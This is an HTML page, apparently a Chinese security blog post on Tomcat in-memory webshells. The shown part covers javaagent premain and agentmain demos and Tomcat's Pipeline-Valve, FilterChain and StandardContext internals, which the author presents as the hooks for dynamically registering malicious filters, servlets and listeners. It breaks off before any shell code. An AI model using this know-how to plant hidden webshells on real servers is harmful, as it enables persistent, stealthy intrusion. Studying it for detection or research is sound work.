
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="self_209&#39;blog">
    <title>Tomcat内存马 - self_209&#39;blog</title>
    <meta name="author" content="self_209">
    
    
    
    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"本文从tomcat容器（Container）的请求处理流程来以及组件的注册流程来分析tomcat内存马的实现。\n\n\n \n\n基础知识内存马类型目前业界的内存马主要分为两大类：\n\nAgent型 利用instrument机制，在不增加新类和新方法的情况下，对现有类的执行逻辑进行修改。JVM层注入，通用性强。\n\n非Agent型 \n\nservlet规范型\n\n动态注册符合servlet规范的自定义恶意组件到web容器中，攻击方通过请求自定义路由实现与内存马通信\n\n\nservlet\nFilter\nListener\n\n\n基于java框架实现型\n\nservlet规范型原理类似，也是动态注册。不同之处是针对java框架的特有属性。\n\n\ntomcat Pipeline-Valve \nstruts2 interceptor\nspring controller\n\n\n\n\n\njava agent基础知识参考：https://xz.aliyun.com/t/9450#toc-3\n\n在JDK1.5以后，javaagent是一种能够在不影响正常编译的情况下，修改字节码。\n\nAgent分为两种，一种是在主程序之前运行的Agent，一种是在主程序之后运行的Agent（前者的升级版，1.6以后提供）\n\npremain方法，主程序之前运行的Agent。\nagentmain方法，主程序之后运行的Agent。\n\npremain写一个premain实例\n1、创建一个PremainAgent类\n123456789import java.lang.instrument.Instrumentation;public class PremainAgent &#123;    public static void premain(String args, Instrumentation inst) throws Exception&#123;        for (int i = 0; i &lt; 3; i++) &#123;            System.out.println(&quot;premain invoke!&quot;);        &#125;    &#125;&#125;\n\n2、在resources包下创建META-INF/MANIFEST.MF文件，并写入如下内容(记得多敲一个回车)\n12345Manifest-Version: 1.0Can-Redefine-Classes: trueCan-Retransform-Classes: truePremain-Class: org.example.PremainAgent\n\n\n\n3、打包成jar包PremainAgent.jar\n\n\n\n\n\n\n4、编写HelloWorld主程序\n1234567public class HelloWorld &#123;    public static void main(String[] args) &#123;        for (int i = 0; i &lt; 3; i++)&#123;            System.out.println(&quot;Hello,World!&quot;);        &#125;    &#125;&#125;\n\n5、打包成HelloWorld.jar包\n这里注意一下设置main class\n\n6、命令行运行java -javaagent:PremainAgent.jar -jar HelloWorld.jar\n\nVirtualMachine该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。\n1234567891011121314public abstract class VirtualMachine &#123;    // 获得当前所有的JVM列表    public static List&lt;VirtualMachineDescriptor&gt; list() &#123; ... &#125;    // 根据pid连接到JVM    public static VirtualMachine attach(String id) &#123; ... &#125;    // 断开连接    public abstract void detach() &#123;&#125;    // 加载agent    public void loadAgent(String agent) &#123; ... &#125;&#125;\n\nInstrumentationInstrumentation 常用方法如下：\n\nvoid addTransformer(ClassFileTransformer transformer, boolean canRetransform); 增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。\nvoid  redefineClasses(ClassDefinition… definitions) hrows  ClassNotFoundException, UnmodifiableClassException; 在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。\nboolean removeTransformer(ClassFileTransformer transformer); 删除一个类转换器\nvoid  retransformClasses(Class&lt;?&gt;… classes) throws UnmodifiableClassException 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。\n\nagentmainagentmain与premain不同在于，agentmain可以在程序执行时加载，下面就来实现一下程序执行时修改程序字节码\n1、创建主程序（也就是被修改的类），无线循环打印Hello,Word!!!\n1234567891011121314151617import java.util.concurrent.TimeUnit;public class Run &#123;    public static void main(String[] args) throws InterruptedException &#123;        Run run = new Run();        while (true)&#123;            run.HelloWord();            TimeUnit.SECONDS.sleep(2);        &#125;    &#125;    public void HelloWord()&#123;        System.out.println(&quot;Hello,Word!!!&quot;);    &#125;&#125;\n\n2、创建一个AgentMain类以及TransformerDemo内部类，TransformerDemo内部类实现ClassFileTransformer接口\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.lang.instrument.Instrumentation;import java.lang.instrument.UnmodifiableClassException;import java.security.ProtectionDomain;public class AgentMain &#123;    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException &#123;        System.out.println(&quot;agentmain invoke ! ! !&quot;);        Class[] classes = inst.getAllLoadedClasses();//获取所有加载的class        for (Class aClass : classes) &#123;            if (aClass.getName().equals(TransformerDemo.editClassName)) &#123;                inst.addTransformer(new TransformerDemo(), true);//添加 Transformer                inst.retransformClasses(aClass);// 触发 Transformer            &#125;        &#125;    &#125;&#125;class TransformerDemo implements ClassFileTransformer &#123;    //需要修改的类    public static final String editClassName = &quot;org.example.Run&quot;;    //修改的方法名    public static final String editMethod = &quot;HelloWord&quot;;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        try &#123;            ClassPool cp = ClassPool.getDefault();//获取的 ClassPool 使用 JVM 的类搜索路径。            if (classBeingRedefined != null) &#123;                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);                cp.insertClassPath(ccp);            &#125;            CtClass ctc = cp.get(editClassName);//获取需要修改的类的Class对象            CtMethod method = ctc.getDeclaredMethod(editMethod);//获取方法            String source = &quot;&#123;System.out.println(\\&quot;Hello transformer!!!\\&quot;);&#125;&quot;;            method.setBody(source);//设置方法体            byte[] bytes = ctc.toBytecode();            ctc.detach();            return bytes;        &#125; catch (Exception e)&#123;            e.printStackTrace();        &#125;        return null;    &#125;&#125;\n\n3、在resources包下创建META-INF/MANIFEST.MF文件，并写入如下内容\n12345Manifest-Version: 1.0Can-Redefine-Classes: trueAgent-Class: org.example.AgentMainCan-Retransform-Classes: true\n\n4、将AgentMain打包成jar包agentmain.jar\n5、编写attachmain用于调用Attach API 实现启动后加载\n123456789public static void main( String[] args ) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;    for (VirtualMachineDescriptor descriptor : VirtualMachine.list()) &#123;        if (descriptor.displayName().equals(&quot;org.example.Run&quot;)) &#123;//判断类名是否为修改的类            VirtualMachine virtualMachine = VirtualMachine.attach(descriptor.id());//根据pid连接需要修改的类            virtualMachine.loadAgent(&quot;C:\\\\IdeaProjects\\\\tomcatdebug\\\\agentmain\\\\out\\\\artifacts\\\\agentmain_jar\\\\agentmain.jar&quot;);//加载agentmain.jar            virtualMachine.detach();        &#125;    &#125;&#125;\n\n6、先启动主程序Run，开始打印Hello,Word!!!\n\n7、启动attachmain加载agentmain.jar，实现修改Run.HelloWord方法字节码\n\nTomcat基础知识Listener\nJavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。\n\n生命周期\n以ServletRequestListener为例，ServletRequestListener主要用于监听ServletRequest对象的创建和销毁,一个ServletRequest可以注册多个ServletRequestListener接口。\n\n每次请求创建时调用requestInitialized()。\n每次请求销毁时调用requestDestroyed()。\n\n代码实现：\n1234567891011121314public class ListenerDemo implements ServletRequestListener &#123;    @Override    public void requestInitialized(ServletRequestEvent sre) &#123;        //每次请求创建时调用        System.out.println(&quot;请求创建&quot;);    &#125;    @Override    public void requestDestroyed(ServletRequestEvent sre) &#123;        //每次请求销毁时调用        System.out.println(&quot;请求销毁&quot;);    &#125;&#125;\n\nFilter\nfilter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。\n\n生命周期\n自定义Filter的实现，需要实现javax.servlet.Filter下的init()、doFilter()、destroy()三个方法。\n\n启动服务器时加载过滤器的实例，并调用init()方法来初始化实例；\n每一次请求时都只调用方法doFilter()进行处理；\n停止服务器时调用destroy()方法，销毁实例。\n\n代码实现：\n12345678910111213141516public class FilterDemo implements Filter &#123;    @Override    public void init(FilterConfig filterConfig) throws ServletException &#123;    &#125;    @Override    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;        System.out.println(&quot;doFilter执行&quot;);        filterChain.doFilter(servletRequest,servletResponse);    &#125;    @Override    public void destroy() &#123;    &#125;&#125;\n\nServlet\nservlet是一种运行服务器端的java应用程序，具有独立于平台和协议的特性，并且可以动态的生成web页面，它工作在客户端请求与服务器响应的中间层。Servlet 的主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。    \n\n生命周期\nServlet 的生命周期开始于Web容器的启动时，它就会被载入到Web容器内存中，直到Web容器停止运行或者重新装入servlet时候结束。这里也就是说明，一旦Servlet被装入到Web容器之后，一般是会长久驻留在Web容器之中。\n\n装入：启动服务器时加载Servlet的实例\n初始化：web服务器启动时或web服务器接收到请求时，或者两者之间的某个时刻启动。初始化工作有init()方法负责执行完成\n调用：从第一次到以后的多次访问，都是只调用doGet()或doPost()方法\n销毁：停止服务器时调用destroy()方法，销毁实例\n\n代码实现：\n12345678public class ServletDemo extends HttpServlet &#123;    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;        System.out.println(&quot;Servlet执行....&quot;);    &#125;&#125;\n\nweb.xml对于这三种组件的加载顺序是：listener -&gt; filter -&gt; servlet，也就是说listener的优先级为三者中最高的。\nContainer 结构Tomcat设计了4种容器，分别是Engine、Host、Context和Wrapper。这4种容器是父子关系。 Tomcat通过一种分层的架构，使得Servlet容器具有很好的灵活性。\n\n各个组件的含义 ：\nEngine:\n\n表示整个Catalina的Servlet引擎，用来管理多个虚拟站点，一个Service最多只能有一个Engine，但是一个引擎可包含多个Host \n\nHost:\n\n代表一个虚拟主机，或者说一个站点，可以给Tomcat配置多个虚拟主机地址，而一个虚拟主机下可包含多个Context\n\nContext:\n\n表示一个Web应用程序， 一个Web应用可包含多个Wrapper\n\nWrapper:\n\n表示一个Servlet，Wrapper 作为容器中的最底层，不能包含子容器\n\nContainer请求处理流程Container处理请求是使用Pipeline-Valve管道来处理的！（Valve是阀门之意）\nPipeline-Valve是责任链模式，责任链模式是指在一个请求处理的过程中有很多处理者依次对请求进行处理，每个处理者负责做自己相应的处理，处理完之后将处理后的请求返回，再让下一个处理着继续处理。\n但是！Pipeline-Valve使用的责任链模式和普通的责任链模式有些不同！区别主要有以下两点：\n\n每个Pipeline都有特定的Valve，而且是在管道的最后一个执行，这个Valve叫做BaseValve，BaseValve是不可删除的；\n\n在上层容器的管道的BaseValve中会调用下层容器的管道。\n\n\n我们知道Container包含四个子容器，而这四个子容器对应的BaseValve分别在：StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve。\nPipeline的处理流程图如下：\n\n\nConnector在接收到请求后会首先调用最顶层容器的Pipeline来处理，这里的最顶层容器的Pipeline就是EnginePipeline（Engine的管道）；\n在Engine的管道中依次会执行EngineValve1、EngineValve2等等，最后会执行StandardEngineValve，在StandardEngineValve中会调用Host管道，然后再依次执行Host的HostValve1、HostValve2等，最后在执行StandardHostValve，然后再依次调用Context的管道和Wrapper的管道，最后执行到StandardWrapperValve。\n当执行到StandardWrapperValve的时候，会在StandardWrapperValve中创建FilterChain，并调用其doFilter方法来处理请求，这个FilterChain包含着我们配置的与请求相匹配的Filter和Servlet，其doFilter方法会依次调用所有的Filter的doFilter方法和Servlet的service方法，这样请求就得到了处理！\n当所有的Pipeline-Valve都执行完之后，并且处理完了具体的请求，这个时候就可以将返回的结果交给Connector了，Connector在通过Socket的方式将结果返回给客户端。\n\nContainer请求处理流程源码分析这里只是对Container的处理流程分析，所以直接找到连接器（Connector）和容器（Container）相连的Adapter组件的实现类CoyoteAdapter，CoyoteAdapter负责将Tomcat Request转成ServletRequest，再调用容器的Service方法。\nService方法\n\n直接看关键代码\n1connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);\n\nconnector.getService() 获取的是当前 connector 关联的 Service 组件，默认情况下获得的就org.apache.catalina.core.StandardService的对象。\n\ngetContainer 方法获得的是org.apache.catalina.core.StandardEngine的对象，这里为什么能获取到StandardEngine对象涉及到了Java 解析 xml 文件，通过Digester 对象所包含的解析规则生成相应对象。这里不做深入研究。\n\n紧接着的 getPipeline 方法返回的是 StandardEngine 类的父类org.apache.catalina.core.ContainerBase类的成员变量 pipeline\n\n\n\n所以 connector.getService().getContainer().getPipeline() 方法返回的是org.apache.catalina.core.StandardPipeline类的对象\n该对象就是前面提到的管道（ Pipeline ）。所有的管道类都会实现org.apache.catalina.Pipeline这个接口，看下这个接口中定义的方法：\n\nTomat中一个管道包含多个阀（ Valve ），这些阀共分为两类，一类叫基础阀（通过 getBasic、setBasic 方法调用），一类是普通阀（通过 addValve、removeValve 调用）。管道都是包含在一个容器当中，所以 API 里还有 getContainer 和 setContainer 方法。一个管道一般有一个基础阀（通过 setBasic 添加），可以有 0 到多个普通阀（通过 addValve 添加）。\n所有的阀类都会实现org.apache.catalina.Valve这个接口，看下这个接口中定义的方法：\n\n重点关注 setNext、getNext、invoke 这三个方法，通过setNext设置该阀的下一阀，通过 getNext 返回该阀的下一个阀的引用，invoke 方法则执行该阀内部自定义的请求处理代码。\nTomcat里 Pipeline 的默认实现类是org.apache.catalina.core.StandardPipeline，其内部有三个成员变量：basic、first、container 。Pipeline 内部维护 first 和 basic 两个阀，其它相关阀通过 getNext 来获取。\n继续看connector.getService().getContainer().getPipeline().getFirst()方法getFirst的实现：\n\n如果管道中有普通阀则返回普通阀链条最开始的那个，否则就返回基础阀。\n那么就来看看 StandardEngine 类的管道中的基础阀的代码实现。先看下该基础阀设置的代码，在org.apache.catalina.core.StandardEngine对象的构造函数中：\n\n第 67行即设置基础阀。所以connector.getService().getContainer().getPipeline().getFirst().invoke(request, response) 类的 invoke 方法会执行到 org.apache.catalina.core.StandardEngineValve 类的 invoke 方法\n\n从请求对象中取出该请求关联的 Hsost（默认情况下是org.apache.catalina.core.StandardHost对象），经过上述代码分析应该可以看出87行会先判断StandardPipeline对象的first属性是否为null，不为null，则返回first对象，所以这里应该是执行AbstractAccessLogValve的invoke方法。\n\n\n通过 getNext 返回该阀的下一个阀的引用\n\n获取到ErrorReportValve，调用ErrorReportValve的invoke方法\n\n再通过 getNext 返回该阀的下一个阀的引用\n\n这里返回StandardHostValve，就会调用StandardHostValve的invoke方法。\n\n第137 行，会调用该请求相关的 Context 的管道内所有的阀的 invoke 方法，默认情况下 Context 是org.apache.catalina.core.StandardContext类的对象，其构造方法中设置了管道的基础阀\n\n所以无论有多少个Valve最后都会调用StandardContextValve的invoke方法，\n\n看下其基础阀的 invoke 方法代码：\n123456789101112131415161718192021222324252627282930313233343536public final void invoke(Request request, Response response)    throws IOException, ServletException &#123;    // Disallow any direct access to resources under WEB-INF or META-INF    MessageBytes requestPathMB = request.getRequestPathMB();    if ((requestPathMB.startsWithIgnoreCase(&quot;/META-INF/&quot;, 0))            || (requestPathMB.equalsIgnoreCase(&quot;/META-INF&quot;))            || (requestPathMB.startsWithIgnoreCase(&quot;/WEB-INF/&quot;, 0))            || (requestPathMB.equalsIgnoreCase(&quot;/WEB-INF&quot;))) &#123;        response.sendError(HttpServletResponse.SC_NOT_FOUND);        return;    &#125;    // Select the Wrapper to be used for this Request    Wrapper wrapper = request.getWrapper();    if (wrapper == null || wrapper.isUnavailable()) &#123;        response.sendError(HttpServletResponse.SC_NOT_FOUND);        return;    &#125;    // Acknowledge the request    try &#123;        response.sendAcknowledgement();    &#125; catch (IOException ioe) &#123;        container.getLogger().error(sm.getString(                &quot;standardContextValve.acknowledgeException&quot;), ioe);        request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, ioe);        response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);        return;    &#125;    if (request.isAsyncSupported()) &#123;        request.setAsyncSupported(wrapper.getPipeline().isAsyncSupported());    &#125;    wrapper.getPipeline().getFirst().invoke(request, response);&#125;\n\n最后一 行，从请求中取出关联的 wrapper 对象后调用其管道内所有阀的 invoke 方法最后调用基础阀StandardWrapperValve的invoke方法。wrapper 对象默认是org.apache.catalina.core.StandardWrapper类的实例，同样是在该类的构造方法中设置的基础阀：\n\n我们来看StandardWrapperValve的invoke方法，代码很长我们直接看关键代码。\n关键代码：\n\n这儿调用Wrapper的allocate()方法分配一个Servlet实例，前面提到wrapper 对象默认是org.apache.catalina.core.StandardWrapper类的实例\n\n123if (!unavailable) &#123;    servlet = wrapper.allocate();&#125;\n\nallocate方法里真正加载并初始化servlet实例的是loadServlet方法\n\nloadServlet方法通过实例管理器，创建Servlet实例\n\n最后返回Servlet\n\n回到StandardWrapperValve中继续往下执行，创建过滤器链\n\n\n创建过滤器链，类似于Pipeline的功能\n\n1ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);\n\n创建过滤器链是调用的org.apache.catalina.core.ApplicationFilterFactory的createFilterChain()方法。\n初始化一个空的 FilterChain。\n\n设置Servlet\n\n获取StandardContext对象，然后调用StandardContext对象的findFilterMaps方法。\n\nfindFilterMaps方法返回filterMaps属性，filterMaps属性是一个ContextFilterMaps对象，里面的array属性是FilterMap对象，FilterMap对象中存储着filter的web.xml的配置信息。FilterMap的filterName属性存储着&lt;filter-name&gt;标签的内容，urlPatterns属性存储着&lt;url-pattern&gt;标签的内容。\n\n\n\n\n获取请求的URL路径和Servlet的名字。\n\n调用FilterMap对象的getFilterName方法，获取ContextFilterMaps对象的FilterMap对象中的filterName属性\n\n\n再调用StandardContext对象的findFilterConfig方法。filterConfigs是一个HashMap对象，里面存放着String和ApplicationFilterConfig类型的键值对对象。这里返回filterConfigs对象中key为FilterDemo的value对象，也就是ApplicationFilterConfig对象。\n\n\nApplicationFilterConfig对象存放着filterDef对象，filterDef对象中存放着filterClass和filterName的定义\n\n继续往下执行，将filterConfig添加到filterChain的filters数组中\n\n返回FilterChain\n\n回到StandardWrapperValve的invoke方法。\n\n\n调用过滤器链的doFilter，最终会调用到Servlet的service方法\n\n1filterChain.doFilter(request.getRequest(),response.getResponse());\n\nApplicationFilterChain类的doFilter函数代码如下,它会将处理委托给internalDoFilter函数。\n123456789101112131415161718192021222324252627282930313233@Overridepublic void doFilter(ServletRequest request, ServletResponse response)    throws IOException, ServletException &#123;    if( Globals.IS_SECURITY_ENABLED ) &#123;        final ServletRequest req = request;        final ServletResponse res = response;        try &#123;            java.security.AccessController.doPrivileged(                new java.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;                    @Override                    public Void run()                        throws ServletException, IOException &#123;                        internalDoFilter(req,res);                        return null;                    &#125;                &#125;            );        &#125; catch( PrivilegedActionException pe) &#123;            Exception e = pe.getException();            if (e instanceof ServletException)                throw (ServletException) e;            else if (e instanceof IOException)                throw (IOException) e;            else if (e instanceof RuntimeException)                throw (RuntimeException) e;            else                throw new ServletException(e.getMessage(), e);        &#125;    &#125; else &#123;        internalDoFilter(request,response);    &#125;&#125;\n\nApplicationFilterChain类的internalDoFilter函数代码如下：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384// 1. internalDoFilter方法通过pos和n来调用过滤器链里面的每个过滤器。pos表示当前的过滤器下标，n表示总的过滤器数量// 2. internalDoFilter方法最终会调用servlet.service()方法private void internalDoFilter(ServletRequest request,                              ServletResponse response)    throws IOException, ServletException &#123;    // Call the next filter if there is one    // 1. 当pos小于n时, 则执行Filter    if (pos &lt; n) &#123;        // 2. 得到 过滤器 Filter，执行一次post++        ApplicationFilterConfig filterConfig = filters[pos++];        try &#123;            Filter filter = filterConfig.getFilter();            if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(                    filterConfig.getFilterDef().getAsyncSupported())) &#123;                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);            &#125;            if( Globals.IS_SECURITY_ENABLED ) &#123;                final ServletRequest req = request;                final ServletResponse res = response;                Principal principal =                    ((HttpServletRequest) req).getUserPrincipal();                Object[] args = new Object[]&#123;req, res, this&#125;;                SecurityUtil.doAsPrivilege (&quot;doFilter&quot;, filter, classType, args, principal);            &#125; else &#123;                // 4. 这里的 filter 的执行 有点递归的感觉, 通过 pos 来控制从 filterChain 里面拿出那个 filter 来进行操作                // 这里把this（filterChain）传到自定义filter里面，我们自定义的filter，会重写doFilter，在这里会被调用，doFilter里面会执行业务逻辑，如果执行业务逻辑成功，则会调用 filterChain.doFilter(servletRequest, servletResponse); ，filterChain就是这里传过去的this；如果业务逻辑执行失败，则return，filterChain终止，后面的servlet.service(request, response)也不会执行了                // 所以在 Filter 里面所调用 return, 则会终止 Filter 的调用, 而下面的 Servlet.service 更本就没有调用到                filter.doFilter(request, response, this);            &#125;        &#125; catch (IOException | ServletException | RuntimeException e) &#123;            throw e;        &#125; catch (Throwable e) &#123;            e = ExceptionUtils.unwrapInvocationTargetException(e);            ExceptionUtils.handleThrowable(e);            throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);        &#125;        return;    &#125;    // We fell off the end of the chain -- call the servlet instance    try &#123;        if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;            lastServicedRequest.set(request);            lastServicedResponse.set(response);        &#125;        if (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;            request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,                    Boolean.FALSE);        &#125;        // Use potentially wrapped request from this point        if ((request instanceof HttpServletRequest) &amp;&amp;                (response instanceof HttpServletResponse) &amp;&amp;                Globals.IS_SECURITY_ENABLED ) &#123;            final ServletRequest req = request;            final ServletResponse res = response;            Principal principal =                ((HttpServletRequest) req).getUserPrincipal();            Object[] args = new Object[]&#123;req, res&#125;;            SecurityUtil.doAsPrivilege(&quot;service&quot;,                                       servlet,                                       classTypeUsedInService,                                       args,                                       principal);        &#125; else &#123;            //当pos等于n时，过滤器都执行完毕，终于执行了熟悉的servlet.service(request, response)方法。            servlet.service(request, response);        &#125;    &#125; catch (IOException | ServletException | RuntimeException e) &#123;        throw e;    &#125; catch (Throwable e) &#123;        e = ExceptionUtils.unwrapInvocationTargetException(e);        ExceptionUtils.handleThrowable(e);        throw new ServletException(sm.getString(&quot;filterChain.servlet&quot;), e);    &#125; finally &#123;        if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;            lastServicedRequest.set(null);            lastServicedResponse.set(null);        &#125;    &#125;&#125;\n\npos和n是ApplicationFilterChain的成员变量，分别表示过滤器链的当前位置和过滤器总数，所以当pos小于n时，会不断执行ApplicationFilterChain的doFilter方法；当pos等于n时，过滤器都执行完毕，最后执行servlet.service(request, response)方法。\nServlet加载与初始化容器组件（ StandardEngine、StandardHost、StandardContext、StandardWrapper ）都会继承父类org.apache.catalina.core.ContainerBase，在这些容器组件启动时将会调用自己内部的 startInternal 方法，在该方法内部一般会调用父类的 startInternal 方法（ StandardContext 类的实现除外），StandardContext 类会调用自己的startInternal 方法，在StandardContext 类的startInternal 方法中，会调用loadOnStartup方法，加载并初始化所有“load on startup”servlet。\n\n跟进findChildren\n\nchildren是一个子容器。\n\nchildren是一个HashMap类型对象，存储着StandardWrapper对象，然后将HashMap类型对象转换为Container类型return，然后进入loadOnStartup方法。这个children就是我们注入Servlet内存马的关键，会在内存马的实现中用到。\n\n\nloadOnStartup\n1234567891011121314151617181920212223242526272829303132333435363738public class StandardContext extends ContainerBase        implements Context, NotificationEmitter &#123;    public boolean loadOnStartup(Container children[]) &#123;        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();        for (Container child : children) &#123;            Wrapper wrapper = (Wrapper) child;             int loadOnStartup = wrapper.getLoadOnStartup();//获取loadOnStartup值            if (loadOnStartup &lt; 0) &#123;                 continue;            &#125;            Integer key = Integer.valueOf(loadOnStartup);//这里key的值就是loadOnStartup值            ArrayList&lt;Wrapper&gt; list = map.get(key);//获取map指定键映射到的值，这里前面并没有添加元素到map中，所以是null            if (list == null) &#123;                list = new ArrayList&lt;&gt;();                map.put(key, list);//将list添加到map中            &#125;&lt;&gt;()            list.add(wrapper); //将wrapper添加到list中，这里的list是ArrayList&lt;&gt;()        &#125;        // Load the collected &quot;load on startup&quot; servlets        for (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;            for (Wrapper wrapper : list) &#123;                try &#123;                    wrapper.load(); // 调用wrapper的load方法加载servlet                &#125; catch (ServletException e) &#123;                    getLogger().error(sm.getString(&quot;standardContext.loadOnStartup.loadException&quot;,                          getName(), wrapper.getName()), StandardWrapper.getRootCause(e));                    if(getComputedFailCtxIfServletStartFails()) &#123;                        return false;                    &#125;                &#125;            &#125;        &#125;        return true;    &#125;\n\n加载并初始化\n\nStandardContextStandardContext是Context的实现类，初始化各种Listener、Filter和Servlet，内存马都是基于修改StandardContext来实现的，下面介绍几个在注入内存马中会用到的方法及属性\nfilterConfigs属性\n存放着filter配置以及实例，以filter名键入\n123456/** * The set of filter configurations (and associated filter instances) we * have initialized, keyed by filter name. */private HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs =        new HashMap&lt;&gt;();\n\nfilterDefs\nfilter定义集，以filter名键入，存储着filter的定义\n12345/** * The set of filter definitions for this application, keyed by * filter name. */private HashMap&lt;String, FilterDef&gt; filterDefs = new HashMap&lt;&gt;();\n\nfilterMaps\nfilter映射集，存储着filter的映射关系\n1234567/** * The set of filter mappings for this application, in the order * they were defined in the deployment descriptor with additional mappings * added via the &#123;@link ServletContext&#125; possibly both before and after those * defined in the deployment descriptor. */private final ContextFilterMaps filterMaps = new ContextFilterMaps();\n\n\naddApplicationEventListener\n将侦听器添加到初始化的应用程序事件侦听器列表的末尾\n123456789/** * Add a listener to the end of the list of initialized application event * listeners. * * @param listener The listener to add */public void addApplicationEventListener(Object listener) &#123;    applicationEventListenersList.add(listener);&#125;\naddFilterDef\n为Context添加一个Filter定义\n1234567891011121314/** * Add a filter definition to this Context. * * @param filterDef The filter definition to be added */@Overridepublic void addFilterDef(FilterDef filterDef) &#123;    synchronized (filterDefs) &#123;        filterDefs.put(filterDef.getFilterName(), filterDef);    &#125;    fireContainerEvent(&quot;addFilterDef&quot;, filterDef);&#125;\naddFilterMap\n在当前的Filter映射集的末尾添加一个Filter映射到这个Context\n1234567891011121314151617/** * Add a filter mapping to this Context at the end of the current set * of filter mappings. * * @param filterMap The filter mapping to be added * * @exception IllegalArgumentException if the specified filter name *  does not match an existing filter definition, or the filter mapping *  is malformed */@Overridepublic void addFilterMap(FilterMap filterMap) &#123;    validateFilterMap(filterMap);    // Add this filter mapping to our registered set    filterMaps.add(filterMap);    fireContainerEvent(&quot;addFilterMap&quot;, filterMap);&#125;\ncreateWrapper\n创建并返回一个新的Wrapper实例\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/**     * Factory method to create and return a new Wrapper instance, of     * the Java implementation class appropriate for this Context     * implementation.  The constructor of the instantiated Wrapper     * will have been called, but no properties will have been set.     */    @Override    public Wrapper createWrapper() &#123;        Wrapper wrapper = null;        if (wrapperClass != null) &#123;            try &#123;                wrapper = (Wrapper) wrapperClass.getConstructor().newInstance();            &#125; catch (Throwable t) &#123;                ExceptionUtils.handleThrowable(t);                log.error(&quot;createWrapper&quot;, t);                return null;            &#125;        &#125; else &#123;            wrapper = new StandardWrapper();        &#125;        synchronized (wrapperLifecyclesLock) &#123;            for (int i = 0; i &lt; wrapperLifecycles.length; i++) &#123;                try &#123;                    Class&lt;?&gt; clazz = Class.forName(wrapperLifecycles[i]);                    LifecycleListener listener =                        (LifecycleListener) clazz.getConstructor().newInstance();                    wrapper.addLifecycleListener(listener);                &#125; catch (Throwable t) &#123;                    ExceptionUtils.handleThrowable(t);                    log.error(&quot;createWrapper&quot;, t);                    return null;                &#125;            &#125;        &#125;        synchronized (wrapperListenersLock) &#123;            for (int i = 0; i &lt; wrapperListeners.length; i++) &#123;                try &#123;                    Class&lt;?&gt; clazz = Class.forName(wrapperListeners[i]);                    ContainerListener listener =                            (ContainerListener) clazz.getConstructor().newInstance();                    wrapper.addContainerListener(listener);                &#125; catch (Throwable t) &#123;                    ExceptionUtils.handleThrowable(t);                    log.error(&quot;createWrapper&quot;, t);                    return null;                &#125;            &#125;        &#125;        return wrapper;    &#125;\naddChild\n添加子容器\n\n\n12345678910111213141516171819202122232425262728293031323334353637383940414243/**     * Add a child Container, only if the proposed child is an implementation     * of Wrapper.     *     * @param child Child container to be added     *     * @exception IllegalArgumentException if the proposed container is     *  not an implementation of Wrapper     */    @Override    public void addChild(Container child) &#123;        // Global JspServlet        Wrapper oldJspServlet = null;        if (!(child instanceof Wrapper)) &#123;            throw new IllegalArgumentException                (sm.getString(&quot;standardContext.notWrapper&quot;));        &#125;        boolean isJspServlet = &quot;jsp&quot;.equals(child.getName());        // Allow webapp to override JspServlet inherited from global web.xml.        if (isJspServlet) &#123;            oldJspServlet = (Wrapper) findChild(&quot;jsp&quot;);            if (oldJspServlet != null) &#123;                removeChild(oldJspServlet);            &#125;        &#125;        super.addChild(child);        if (isJspServlet &amp;&amp; oldJspServlet != null) &#123;            /*             * The webapp-specific JspServlet inherits all the mappings             * specified in the global web.xml, and may add additional ones.             */            String[] jspMappings = oldJspServlet.findMappings();            for (int i=0; jspMappings!=null &amp;&amp; 